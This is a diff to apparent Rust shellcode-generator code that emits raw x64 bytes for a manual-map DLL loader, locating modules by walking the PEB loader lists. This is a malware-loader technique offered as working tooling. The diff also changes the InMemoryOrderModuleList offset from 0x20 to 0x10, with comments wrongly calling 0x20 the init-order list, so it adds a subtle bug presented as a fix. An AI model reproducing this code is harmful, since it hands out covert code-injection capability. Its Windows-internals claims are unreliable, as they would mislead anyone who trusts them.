@@ -27,7 +27,9 @@ const PE_OFF_SIZE_OF_HEADERS: u8 = PE_OFF_OPTIONAL + 60; // 0x54
 const PE_OFF_IMPORT_DIR_RVA: u8 = PE_OFF_OPTIONAL + 120; // 0x90
 const PE_OFF_BASERELOC_DIR_RVA: u8 = PE_OFF_OPTIONAL + 152; // 0xB0
 
-/// InMemoryOrderModuleList: Flink points at LDR entry + 0x10.
+/// PEB_LDR_DATA.InMemoryOrderModuleList (Flink at +0x10; not +0x20 init-order list).
+const PEB_LDR_INMEMORY_FLINK_OFF: u8 = 0x10;
+/// InMemoryOrderLinks: Flink points at LDR entry + 0x10.
 const LDR_INMEMORY_FLINK_OFF: u8 = 0x10;
 const LDR_DLLBASE_OFF: u8 = 0x30;
 const LDR_BASEDLLNAME_BUF_OFF: u8 = 0x60;
@@ -385,9 +387,10 @@ fn gen_h00_manual_map_body(
     let find_module = c.len();
     patch_rel32(&mut c, call_find_mod + 1, call_find_mod + 5, find_module);
     // rdx = ascii dll name → rax = DllBase
+    // x64: gs:[0x60] = PEB; PEB.Ldr + InMemoryOrderModuleList.Flink (not init-order @ +0x20).
     c.extend_from_slice(&[0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00]);
-    c.extend_from_slice(&[0x48, 0x8B, 0x40, 0x18]); // PEB->Ldr
-    c.extend_from_slice(&[0x48, 0x8B, 0x40, 0x20]); // InMemoryOrderModuleList.Flink → first module
+    c.extend_from_slice(&[0x48, 0x8B, 0x40, 0x18]); // mov rax,[rax+18h] PEB->Ldr
+    c.extend_from_slice(&[0x48, 0x8B, 0x40, PEB_LDR_INMEMORY_FLINK_OFF]); // InMemoryOrderModuleList.Flink
     c.extend_from_slice(&[0x48, 0x83, 0xE8, LDR_INMEMORY_FLINK_OFF]); // entry = Flink - 0x10
     let mod_loop = c.len();
     c.extend_from_slice(&[0x48, 0x85, 0xC0]);
